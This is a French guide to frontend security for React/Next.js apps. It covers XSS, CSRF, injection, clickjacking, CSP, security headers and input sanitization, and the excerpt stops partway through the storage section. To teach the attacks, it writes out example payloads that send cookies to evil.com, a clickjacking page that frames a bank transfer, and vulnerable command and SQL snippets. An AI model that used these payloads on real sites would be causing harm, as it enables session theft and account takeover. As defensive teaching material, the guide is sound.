# Guide Sécurité Frontend - XSS, CSRF et Autres Attaques

> Guide complet pour protéger votre application frontend contre les attaques courantes

---

## Table des Matières

1. [Vue d'Ensemble des Menaces](#vue-densemble-des-menaces)
2. [XSS - Cross-Site Scripting](#xss---cross-site-scripting)
3. [CSRF - Cross-Site Request Forgery](#csrf---cross-site-request-forgery)
4. [Injection de Contenu](#injection-de-contenu)
5. [Clickjacking](#clickjacking)
6. [Content Security Policy (CSP)](#content-security-policy-csp)
7. [Headers de Sécurité](#headers-de-sécurité)
8. [Validation des Entrées](#validation-des-entrées)
9. [Sanitization des Données](#sanitization-des-données)
10. [Sécurité des Formulaires](#sécurité-des-formulaires)
11. [Stockage Sécurisé](#stockage-sécurisé)
12. [Bonnes Pratiques React/Next.js](#bonnes-pratiques-reactnextjs)
13. [Audit et Monitoring](#audit-et-monitoring)
14. [Checklist de Sécurité](#checklist-de-sécurité)

---

## Vue d'Ensemble des Menaces

### Top 10 Vulnérabilités Frontend

| Rang | Vulnérabilité | Gravité | Fréquence |
|------|---------------|---------|-----------|
| 1 | **XSS** (Cross-Site Scripting) | Critique | Très fréquent |
| 2 | **CSRF** (Cross-Site Request Forgery) | Haute | Fréquent |
| 3 | **Injection** (SQL, NoSQL, Command) | Critique | Fréquent |
| 4 | **Broken Authentication** | Critique | Fréquent |
| 5 | **Sensitive Data Exposure** | Haute | Très fréquent |
| 6 | **Clickjacking** | Moyenne | Occasionnel |
| 7 | **Open Redirects** | Moyenne | Occasionnel |
| 8 | **DOM-based attacks** | Haute | Fréquent |
| 9 | **Prototype Pollution** | Haute | Occasionnel |
| 10 | **Supply Chain Attacks** | Critique | En hausse |

### Principe de Défense en Profondeur

```
┌─────────────────────────────────────────────────────────────┐
│                    Couches de Sécurité                      │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────────┐   │
│  │           WAF (Web Application Firewall)             │   │
│  └─────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Headers de Sécurité (CSP, etc.)        │   │
│  └─────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Validation des Entrées                  │   │
│  └─────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Sanitization des Sorties               │   │
│  └─────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Protection CSRF                         │   │
│  └─────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Authentification/Autorisation          │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## XSS - Cross-Site Scripting

### Types d'XSS

#### 1. XSS Réfléchi (Reflected)

Le script malveillant vient de la requête HTTP.

```
// URL malveillante
https://site.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// Si le site affiche la recherche sans échappement :
<p>Résultats pour : <script>...</script></p>
```

#### 2. XSS Stocké (Stored)

Le script est stocké en base de données.

```javascript
// Commentaire malveillant stocké en DB
{
  author: "Hacker",
  content: "<img src=x onerror='fetch(`https://evil.com/steal?c=${document.cookie}`)'>"
}

// Affiché à tous les utilisateurs
```

#### 3. XSS DOM-based

Le script manipule le DOM directement côté client.

```javascript
// Code vulnérable
const userInput = window.location.hash.slice(1);
document.getElementById('output').innerHTML = userInput;

// URL malveillante
https://site.com/#<img src=x onerror=alert('XSS')>
```

### Protection contre XSS

#### 1. Échappement Automatique (React)

```tsx
// ✅ React échappe automatiquement
function SafeComponent({ userInput }: { userInput: string }) {
  // Les caractères spéciaux sont échappés
  return <div>{userInput}</div>;
}

// Entrée: "<script>alert('xss')</script>"
// Sortie: &lt;script&gt;alert('xss')&lt;/script&gt;
```

#### 2. Éviter dangerouslySetInnerHTML

```tsx
// ❌ DANGEREUX : À éviter
function DangerousComponent({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Si absolument nécessaire : Sanitizer d'abord
import DOMPurify from 'isomorphic-dompurify';

function SafeHTMLComponent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

#### 3. Service de Sanitization

```typescript
// lib/security/sanitizer.ts
import DOMPurify from 'isomorphic-dompurify';

// Configuration stricte par défaut
const DEFAULT_CONFIG: DOMPurify.Config = {
  ALLOWED_TAGS: [
    'b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'code', 'pre',
  ],
  ALLOWED_ATTR: ['href', 'title', 'target', 'rel', 'class'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'], // Forcer target sur les liens
  FORBID_TAGS: ['style', 'script', 'iframe', 'form', 'input'],
  FORBID_ATTR: ['style', 'onerror', 'onclick', 'onload'],
};

// Profiles de sanitization
const PROFILES = {
  strict: {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: [],
  },
  basic: {
    ...DEFAULT_CONFIG,
  },
  rich: {
    ...DEFAULT_CONFIG,
    ALLOWED_TAGS: [
      ...DEFAULT_CONFIG.ALLOWED_TAGS!,
      'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
    ],
    ALLOWED_ATTR: [...DEFAULT_CONFIG.ALLOWED_ATTR!, 'src', 'alt', 'width', 'height'],
  },
} as const;

type SanitizeProfile = keyof typeof PROFILES;

/**
 * Sanitize HTML content
 */
export function sanitizeHTML(
  dirty: string,
  profile: SanitizeProfile = 'basic'
): string {
  const config = PROFILES[profile];

  // Hooks pour sécurité additionnelle
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    // Forcer rel="noopener noreferrer" sur les liens externes
    if (node.tagName === 'A') {
      const href = node.getAttribute('href');
      if (href?.startsWith('http')) {
        node.setAttribute('target', '_blank');
        node.setAttribute('rel', 'noopener noreferrer');
      }
    }

    // Supprimer les attributs data-*
    Array.from(node.attributes).forEach((attr) => {
      if (attr.name.startsWith('data-')) {
        node.removeAttribute(attr.name);
      }
    });
  });

  const clean = DOMPurify.sanitize(dirty, config);

  DOMPurify.removeHook('afterSanitizeAttributes');

  return clean;
}

/**
 * Sanitize pour affichage texte uniquement (pas de HTML)
 */
export function sanitizeText(input: string): string {
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
}

/**
 * Encode pour utilisation dans un attribut HTML
 */
export function encodeHTMLAttribute(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Encode pour utilisation dans une URL
 */
export function encodeURLParameter(input: string): string {
  return encodeURIComponent(input);
}

/**
 * Sanitize une URL (protection contre javascript:, data:, etc.)
 */
export function sanitizeURL(url: string): string | null {
  try {
    const parsed = new URL(url, window.location.origin);

    // Protocoles autorisés
    const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];

    if (!allowedProtocols.includes(parsed.protocol)) {
      console.warn('Blocked URL with protocol:', parsed.protocol);
      return null;
    }

    return parsed.toString();
  } catch {
    return null;
  }
}
```

#### 4. Composant SafeLink

```tsx
// components/security/SafeLink.tsx
'use client';

import { sanitizeURL } from '@/lib/security/sanitizer';
import { AnchorHTMLAttributes, forwardRef } from 'react';

interface SafeLinkProps extends AnchorHTMLAttributes<HTMLAnchorElement> {
  href: string;
  external?: boolean;
}

export const SafeLink = forwardRef<HTMLAnchorElement, SafeLinkProps>(
  ({ href, external, children, ...props }, ref) => {
    const safeHref = sanitizeURL(href);

    if (!safeHref) {
      console.warn('Blocked unsafe URL:', href);
      return <span {...props}>{children}</span>;
    }

    const isExternal = external ?? safeHref.startsWith('http');

    return (
      <a
        ref={ref}
        href={safeHref}
        {...(isExternal && {
          target: '_blank',
          rel: 'noopener noreferrer',
        })}
        {...props}
      >
        {children}
      </a>
    );
  }
);

SafeLink.displayName = 'SafeLink';
```

---

## CSRF - Cross-Site Request Forgery

### Comment fonctionne CSRF

```
┌─────────────┐         ┌─────────────┐         ┌─────────────┐
│ Utilisateur │         │ Site Evil   │         │ Votre Site  │
└──────┬──────┘         └──────┬──────┘         └──────┬──────┘
       │                       │                       │
       │  1. Login réussi      │                       │
       │  ─────────────────────────────────────────▶   │
       │                       │                       │
       │  2. Cookie session    │                       │
       │  ◀─────────────────────────────────────────   │
       │                       │                       │
       │  3. Visite evil.com   │                       │
       │  ─────────────────▶   │                       │
       │                       │                       │
       │  4. Page avec formulaire caché                │
       │  ◀─────────────────   │                       │
       │                       │                       │
       │  5. Formulaire auto-submit (avec cookie)      │
       │  ─────────────────────────────────────────▶   │
       │                       │    (Transfert argent) │
       │                       │                       │
```

### Protection CSRF

#### 1. Token CSRF Synchronizer

```typescript
// lib/security/csrf.ts
import { randomBytes, createHmac } from 'crypto';
import { cookies } from 'next/headers';

const CSRF_SECRET = process.env.CSRF_SECRET!;
const CSRF_TOKEN_COOKIE = 'csrf_token';
const CSRF_HEADER = 'X-CSRF-Token';

/**
 * Génère un token CSRF
 */
export function generateCSRFToken(): string {
  const token = randomBytes(32).toString('hex');
  const timestamp = Date.now().toString();
  const signature = createHmac('sha256', CSRF_SECRET)
    .update(`${token}:${timestamp}`)
    .digest('hex');

  return `${token}:${timestamp}:${signature}`;
}

/**
 * Valide un token CSRF
 */
export function validateCSRFToken(token: string): boolean {
  try {
    const [rawToken, timestamp, signature] = token.split(':');

    // Vérifier l'âge (max 1 heure)
    const tokenAge = Date.now() - parseInt(timestamp, 10);
    if (tokenAge > 3600000) {
      return false;
    }

    // Vérifier la signature
    const expectedSignature = createHmac('sha256', CSRF_SECRET)
      .update(`${rawToken}:${timestamp}`)
      .digest('hex');

    return signature === expectedSignature;
  } catch {
    return false;
  }
}

/**
 * Middleware CSRF pour API routes
 */
export async function csrfMiddleware(request: Request): Promise<Response | null> {
  // Ignorer les méthodes safe (GET, HEAD, OPTIONS)
  const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
  if (safeMethods.includes(request.method)) {
    return null;
  }

  // Récupérer le token du header
  const headerToken = request.headers.get(CSRF_HEADER);

  // Récupérer le token du cookie
  const cookieStore = await cookies();
  const cookieToken = cookieStore.get(CSRF_TOKEN_COOKIE)?.value;

  // Vérifier que les deux tokens correspondent et sont valides
  if (!headerToken || !cookieToken || headerToken !== cookieToken) {
    return new Response(
      JSON.stringify({ error: 'Invalid CSRF token' }),
      { status: 403, headers: { 'Content-Type': 'application/json' } }
    );
  }

  if (!validateCSRFToken(headerToken)) {
    return new Response(
      JSON.stringify({ error: 'CSRF token expired' }),
      { status: 403, headers: { 'Content-Type': 'application/json' } }
    );
  }

  return null; // OK, continuer
}

/**
 * Set CSRF cookie
 */
export async function setCSRFCookie(): Promise<string> {
  const token = generateCSRFToken();
  const cookieStore = await cookies();

  cookieStore.set(CSRF_TOKEN_COOKIE, token, {
    httpOnly: false, // Doit être lisible par JavaScript
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/',
    maxAge: 3600, // 1 heure
  });

  return token;
}
```

#### 2. Hook CSRF pour le Client

```typescript
// hooks/useCSRF.ts
'use client';

import { useState, useEffect, useCallback } from 'react';

const CSRF_COOKIE_NAME = 'csrf_token';
const CSRF_HEADER_NAME = 'X-CSRF-Token';

function getCookie(name: string): string | null {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) {
    return parts.pop()?.split(';').shift() ?? null;
  }
  return null;
}

export function useCSRF() {
  const [csrfToken, setCSRFToken] = useState<string | null>(null);

  useEffect(() => {
    const token = getCookie(CSRF_COOKIE_NAME);
    setCSRFToken(token);
  }, []);

  const getHeaders = useCallback((): Record<string, string> => {
    if (!csrfToken) {
      console.warn('CSRF token not available');
      return {};
    }
    return { [CSRF_HEADER_NAME]: csrfToken };
  }, [csrfToken]);

  const fetchWithCSRF = useCallback(
    async (url: string, options: RequestInit = {}): Promise<Response> => {
      const headers = new Headers(options.headers);

      if (csrfToken) {
        headers.set(CSRF_HEADER_NAME, csrfToken);
      }

      return fetch(url, {
        ...options,
        headers,
        credentials: 'same-origin', // Inclure les cookies
      });
    },
    [csrfToken]
  );

  return {
    csrfToken,
    getHeaders,
    fetchWithCSRF,
    headerName: CSRF_HEADER_NAME,
  };
}
```

#### 3. Protection SameSite Cookie

```typescript
// La meilleure protection CSRF : SameSite=Strict ou Lax

// Configuration des cookies de session
const sessionCookieConfig = {
  httpOnly: true,
  secure: true,
  sameSite: 'lax' as const, // Protège contre CSRF basic
  // sameSite: 'strict' as const, // Protection maximale (peut casser certains flows)
  path: '/',
};
```

#### 4. Double Submit Cookie Pattern

```typescript
// lib/security/double-submit.ts

/**
 * Pattern Double Submit Cookie
 * Le token est envoyé à la fois dans un cookie et dans le body/header
 */
export function verifyDoubleSubmit(
  cookieToken: string | undefined,
  requestToken: string | undefined
): boolean {
  if (!cookieToken || !requestToken) {
    return false;
  }

  // Comparaison timing-safe
  return timingSafeEqual(cookieToken, requestToken);
}

function timingSafeEqual(a: string, b: string): boolean {
  if (a.length !== b.length) {
    return false;
  }

  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }

  return result === 0;
}
```

---

## Injection de Contenu

### Protection contre l'Injection SQL

```typescript
// ✅ Utiliser Prisma (requêtes paramétrées automatiques)
const user = await prisma.user.findUnique({
  where: { email: userInput }, // Sécurisé automatiquement
});

// ❌ JAMAIS de concaténation SQL
const query = `SELECT * FROM users WHERE email = '${userInput}'`; // VULNÉRABLE

// ✅ Si requête raw nécessaire, utiliser les paramètres
const users = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${userInput}
`;
```

### Protection contre l'Injection de Commandes

```typescript
// ❌ DANGEREUX : Exécution de commande avec input utilisateur
import { exec } from 'child_process';
exec(`ls ${userInput}`); // VULNÉRABLE

// ✅ Utiliser des bibliothèques sécurisées avec arguments séparés
import { execFile } from 'child_process';
execFile('ls', ['-la', sanitizedPath]); // Plus sûr

// ✅ Mieux : Éviter exec si possible
import { readdir } from 'fs/promises';
const files = await readdir(sanitizedPath);
```

### Protection contre l'Injection NoSQL

```typescript
// ❌ VULNÉRABLE : Opérateurs MongoDB dans l'input
const user = await collection.findOne({
  username: userInput, // Si userInput = { "$gt": "" }
});

// ✅ Valider le type de l'input
import { z } from 'zod';

const usernameSchema = z.string().min(1).max(50);
const username = usernameSchema.parse(userInput);

const user = await collection.findOne({ username });
```

---

## Clickjacking

### Principe

L'attaquant superpose un iframe invisible sur un bouton légitime.

```html
<!-- Site de l'attaquant -->
<style>
  iframe {
    opacity: 0;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
  }
  .fake-button {
    position: relative;
    z-index: -1;
  }
</style>

<button class="fake-button">Cliquez pour gagner !</button>
<iframe src="https://bank.com/transfer?to=hacker&amount=1000"></iframe>
```

### Protection

```typescript
// middleware.ts ou next.config.js
const securityHeaders = [
  {
    key: 'X-Frame-Options',
    value: 'DENY', // ou 'SAMEORIGIN'
  },
  {
    key: 'Content-Security-Policy',
    value: "frame-ancestors 'none'", // Plus moderne que X-Frame-Options
  },
];

// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

### Frame Buster JavaScript (Fallback)

```typescript
// Pour les vieux navigateurs
if (window.self !== window.top) {
  // La page est dans un iframe
  window.top!.location = window.self.location;
}
```

---

## Content Security Policy (CSP)

### Configuration CSP Complète

```typescript
// lib/security/csp.ts

interface CSPDirectives {
  'default-src': string[];
  'script-src': string[];
  'style-src': string[];
  'img-src': string[];
  'font-src': string[];
  'connect-src': string[];
  'frame-src': string[];
  'frame-ancestors': string[];
  'form-action': string[];
  'base-uri': string[];
  'object-src': string[];
  'upgrade-insecure-requests'?: boolean;
  'block-all-mixed-content'?: boolean;
}

const CSP_DIRECTIVES: CSPDirectives = {
  'default-src': ["'self'"],

  'script-src': [
    "'self'",
    "'strict-dynamic'", // Permet les scripts chargés par des scripts de confiance
    // "'unsafe-inline'", // À éviter ! Utiliser nonce ou hash
    // "'unsafe-eval'",   // À éviter !
  ],

  'style-src': [
    "'self'",
    "'unsafe-inline'", // Nécessaire pour certains frameworks CSS-in-JS
    'https://fonts.googleapis.com',
  ],

  'img-src': [
    "'self'",
    'data:',
    'blob:',
    'https:',
  ],

  'font-src': [
    "'self'",
    'https://fonts.gstatic.com',
  ],

  'connect-src': [
    "'self'",
    process.env.NEXT_PUBLIC_API_URL!,
    'https://api.stripe.com', // Si vous utilisez Stripe
  ],

  'frame-src': [
    "'self'",
    'https://js.stripe.com', // Pour Stripe Elements
  ],

  'frame-ancestors': ["'none'"], // Clickjacking protection

  'form-action': ["'self'"],

  'base-uri': ["'self'"],

  'object-src': ["'none'"],

  'upgrade-insecure-requests': true,
  'block-all-mixed-content': true,
};

/**
 * Génère le header CSP
 */
export function generateCSP(nonce?: string): string {
  const directives: string[] = [];

  for (const [key, value] of Object.entries(CSP_DIRECTIVES)) {
    if (typeof value === 'boolean') {
      if (value) directives.push(key);
    } else if (Array.isArray(value)) {
      let values = [...value];

      // Ajouter le nonce pour script-src si fourni
      if (key === 'script-src' && nonce) {
        values.push(`'nonce-${nonce}'`);
      }

      directives.push(`${key} ${values.join(' ')}`);
    }
  }

  return directives.join('; ');
}

/**
 * Génère un nonce unique
 */
export function generateNonce(): string {
  const array = new Uint8Array(16);
  crypto.getRandomValues(array);
  return Buffer.from(array).toString('base64');
}
```

### Middleware CSP pour Next.js

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { generateCSP, generateNonce } from '@/lib/security/csp';

export function middleware(request: NextRequest) {
  const nonce = generateNonce();
  const csp = generateCSP(nonce);

  const response = NextResponse.next();

  // Ajouter le CSP header
  response.headers.set('Content-Security-Policy', csp);

  // Passer le nonce aux composants via un header
  response.headers.set('x-nonce', nonce);

  return response;
}
```

### Utilisation du Nonce dans les Scripts

```tsx
// app/layout.tsx
import { headers } from 'next/headers';

export default async function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const headersList = await headers();
  const nonce = headersList.get('x-nonce') ?? '';

  return (
    <html>
      <head>
        {/* Script inline avec nonce */}
        <script
          nonce={nonce}
          dangerouslySetInnerHTML={{
            __html: `console.log('Script autorisé');`,
          }}
        />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

### CSP Report-Only (Monitoring)

```typescript
// Pour tester sans bloquer
const cspReportOnly = `${csp}; report-uri /api/csp-report`;

response.headers.set('Content-Security-Policy-Report-Only', cspReportOnly);
```

```typescript
// app/api/csp-report/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  const report = await request.json();

  console.log('CSP Violation:', report);

  // Envoyer à un service de monitoring (Sentry, etc.)

  return NextResponse.json({ received: true });
}
```

---

## Headers de Sécurité

### Configuration Complète

```typescript
// next.config.js
const securityHeaders = [
  // Clickjacking protection
  {
    key: 'X-Frame-Options',
    value: 'DENY',
  },
  // XSS protection (navigateurs anciens)
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block',
  },
  // Empêche le MIME sniffing
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff',
  },
  // Referrer policy
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin',
  },
  // Permissions policy (remplace Feature-Policy)
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=(self), payment=(self)',
  },
  // HSTS (HTTPS strict)
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=31536000; includeSubDomains; preload',
  },
  // CSP
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';",
  },
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

### Middleware pour Headers Dynamiques

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const response = NextResponse.next();

  // Headers de sécurité
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('X-XSS-Protection', '1; mode=block');
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  response.headers.set(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(self)'
  );

  // HSTS (uniquement en production)
  if (process.env.NODE_ENV === 'production') {
    response.headers.set(
      'Strict-Transport-Security',
      'max-age=31536000; includeSubDomains; preload'
    );
  }

  return response;
}
```

---

## Validation des Entrées

### Schémas Zod Sécurisés

```typescript
// lib/validations/secure-schemas.ts
import { z } from 'zod';

/**
 * Email avec validation stricte
 */
export const emailSchema = z
  .string()
  .email('Email invalide')
  .max(254, 'Email trop long')
  .toLowerCase()
  .trim();

/**
 * Mot de passe fort
 */
export const passwordSchema = z
  .string()
  .min(8, 'Minimum 8 caractères')
  .max(128, 'Maximum 128 caractères')
  .regex(/[a-z]/, 'Au moins une minuscule')
  .regex(/[A-Z]/, 'Au moins une majuscule')
  .regex(/[0-9]/, 'Au moins un chiffre')
  .regex(/[^a-zA-Z0-9]/, 'Au moins un caractère spécial');

/**
 * Nom d'utilisateur
 */
export const usernameSchema = z
  .string()
  .min(3, 'Minimum 3 caractères')
  .max(30, 'Maximum 30 caractères')
  .regex(/^[a-zA-Z0-9_-]+$/, 'Caractères alphanumériques, _ et - uniquement')
  .toLowerCase()
  .trim();

/**
 * URL sécurisée
 */
export const urlSchema = z
  .string()
  .url('URL invalide')
  .refine(
    (url) => {
      try {
        const parsed = new URL(url);
        return ['http:', 'https:'].includes(parsed.protocol);
      } catch {
        return false;
      }
    },
    'Seuls les protocoles HTTP et HTTPS sont autorisés'
  );

/**
 * Numéro de téléphone (format international)
 */
export const phoneSchema = z
  .string()
  .regex(/^\+[1-9]\d{1,14}$/, 'Format international requis (+33612345678)');

/**
 * Texte libre (avec limites)
 */
export const freeTextSchema = (maxLength: number = 1000) =>
  z
    .string()
    .max(maxLength, `Maximum ${maxLength} caractères`)
    .transform((val) => val.trim());

/**
 * ID (UUID ou CUID)
 */
export const idSchema = z.string().regex(
  /^[a-zA-Z0-9_-]{21,36}$/,
  'ID invalide'
);

/**
 * Pagination
 */
export const paginationSchema = z.object({
  page: z.coerce.number().int().positive().default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(['asc', 'desc']).optional().default('desc'),
});

/**
 * Fichier upload
 */
export const fileUploadSchema = z.object({
  name: z.string().max(255),
  size: z.number().max(10 * 1024 * 1024), // 10MB max
  type: z.enum([
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/webp',
    'application/pdf',
  ]),
});

/**
 * Search query (protection injection)
 */
export const searchQuerySchema = z
  .string()
  .max(200)
  .transform((val) => {
    // Échapper les caractères spéciaux pour la recherche
    return val
      .replace(/[\\%_]/g, '\\$&') // Échapper pour SQL LIKE
      .trim();
  });
```

### Validation dans les API Routes

```typescript
// app/api/users/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { z } from 'zod';
import { emailSchema, passwordSchema, usernameSchema } from '@/lib/validations/secure-schemas';

const createUserSchema = z.object({
  email: emailSchema,
  password: passwordSchema,
  username: usernameSchema,
});

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();

    // Validation avec Zod
    const data = createUserSchema.parse(body);

    // ... créer l'utilisateur

    return NextResponse.json({ success: true });
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        {
          error: 'Validation failed',
          details: error.errors.map((e) => ({
            field: e.path.join('.'),
            message: e.message,
          })),
        },
        { status: 400 }
      );
    }

    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
```

---

## Sanitization des Données

### Service de Sanitization Complet

```typescript
// lib/security/sanitization-service.ts
import DOMPurify from 'isomorphic-dompurify';

export class SanitizationService {
  /**
   * Sanitize HTML (pour contenu riche)
   */
  static html(input: string, allowedTags?: string[]): string {
    return DOMPurify.sanitize(input, {
      ALLOWED_TAGS: allowedTags ?? ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
      ALLOWED_ATTR: ['href', 'title'],
    });
  }

  /**
   * Échapper pour affichage texte
   */
  static text(input: string): string {
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }

  /**
   * Sanitize pour utilisation dans une regex
   */
  static regex(input: string): string {
    return input.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  /**
   * Sanitize pour JSON
   */
  static json(input: string): string {
    return input
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t');
  }

  /**
   * Sanitize nom de fichier
   */
  static filename(input: string): string {
    return input
      .replace(/[^a-zA-Z0-9._-]/g, '_') // Caractères autorisés uniquement
      .replace(/\.{2,}/g, '.') // Pas de .. (path traversal)
      .slice(0, 255); // Limite de longueur
  }

  /**
   * Sanitize path (protection path traversal)
   */
  static path(input: string, basePath: string): string | null {
    const path = require('path');
    const resolved = path.resolve(basePath, input);

    // Vérifier que le path résolu est bien dans le basePath
    if (!resolved.startsWith(path.resolve(basePath))) {
      console.warn('Path traversal attempt blocked:', input);
      return null;
    }

    return resolved;
  }

  /**
   * Supprimer les caractères de contrôle
   */
  static removeControlChars(input: string): string {
    // Supprimer les caractères de contrôle (sauf newline et tab)
    return input.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
  }

  /**
   * Normaliser les espaces
   */
  static normalizeWhitespace(input: string): string {
    return input
      .replace(/\s+/g, ' ') // Remplacer multiples espaces par un seul
      .trim();
  }

  /**
   * Sanitization complète pour input utilisateur
   */
  static userInput(input: string): string {
    return this.normalizeWhitespace(
      this.removeControlChars(input)
    );
  }
}
```

---

## Sécurité des Formulaires

### Composant de Formulaire Sécurisé

```tsx
// components/forms/SecureForm.tsx
'use client';

import { FormEvent, ReactNode, useState } from 'react';
import { useCSRF } from '@/hooks/useCSRF';

interface SecureFormProps {
  onSubmit: (data: FormData) => Promise<void>;
  children: ReactNode;
  className?: string;
  /** Honeypot field name */
  honeypot?: string;
  /** Rate limit en ms entre les soumissions */
  rateLimit?: number;
}

export function SecureForm({
  onSubmit,
  children,
  className,
  honeypot = '_hp_field',
  rateLimit = 1000,
}: SecureFormProps) {
  const { csrfToken, headerName } = useCSRF();
  const [lastSubmit, setLastSubmit] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    // Rate limiting
    const now = Date.now();
    if (now - lastSubmit < rateLimit) {
      console.warn('Form submission rate limited');
      return;
    }

    const formData = new FormData(e.currentTarget);

    // Honeypot check (détection de bots)
    const honeypotValue = formData.get(honeypot);
    if (honeypotValue) {
      console.warn('Honeypot triggered, likely bot');
      return;
    }
    formData.delete(honeypot);

    // Ajouter le token CSRF
    if (csrfToken) {
      formData.set('_csrf', csrfToken);
    }

    setLastSubmit(now);
    setIsSubmitting(true);

    try {
      await onSubmit(formData);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className={className}>
      {/* Honeypot field (invisible pour les humains) */}
      <div style={{ position: 'absolute', left: '-9999px' }} aria-hidden="true">
        <label>
          Ne pas remplir
          <input
            type="text"
            name={honeypot}
            tabIndex={-1}
            autoComplete="off"
          />
        </label>
      </div>

      {/* CSRF token hidden */}
      {csrfToken && (
        <input type="hidden" name="_csrf" value={csrfToken} />
      )}

      {children}

      {isSubmitting && (
        <div className="absolute inset-0 bg-white/50 flex items-center justify-center">
          <span>Envoi en cours...</span>
        </div>
      )}
    </form>
  );
}
```

### Input Sécurisé avec Validation

```tsx
// components/forms/SecureInput.tsx
'use client';

import { InputHTMLAttributes, forwardRef, useState } from 'react';
import { SanitizationService } from '@/lib/security/sanitization-service';

interface SecureInputProps extends InputHTMLAttributes<HTMLInputElement> {
  /** Sanitize l'input en temps réel */
  sanitize?: boolean;
  /** Message d'erreur */
  error?: string;
  /** Label */
  label?: string;
}

export const SecureInput = forwardRef<HTMLInputElement, SecureInputProps>(
  ({ sanitize = true, error, label, onChange, ...props }, ref) => {
    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      if (sanitize) {
        // Sanitize la valeur
        e.target.value = SanitizationService.userInput(e.target.value);
      }

      onChange?.(e);
    };

    return (
      <div className="space-y-1">
        {label && (
          <label
            htmlFor={props.id}
            className="block text-sm font-medium text-gray-700"
          >
            {label}
          </label>
        )}

        <input
          ref={ref}
          onChange={handleChange}
          className={`
            block w-full rounded-md border px-3 py-2
            ${error ? 'border-red-500' : 'border-gray-300'}
            focus:outline-none focus:ring-2 focus:ring-blue-500
          `}
          {...props}
        />

        {error && (
          <p className="text-sm text-red-600">{error}</p>
        )}
      </div>
    );
  }
);

SecureInput.displayName = 'SecureInput';
```

---

## Stockage Sécurisé

### LocalStorage vs Cookies

```typescript
// lib/security/secure-storage.ts

/**
 * Stockage sécurisé côté client
 * ATTENTION : Ne JAMAIS stocker de tokens sensibles dans localStorage
 */
export const secureStorage = {
  /**
   * Stocker une valeur non sensible
   */
  set(key: string, value: any): void {
    try {
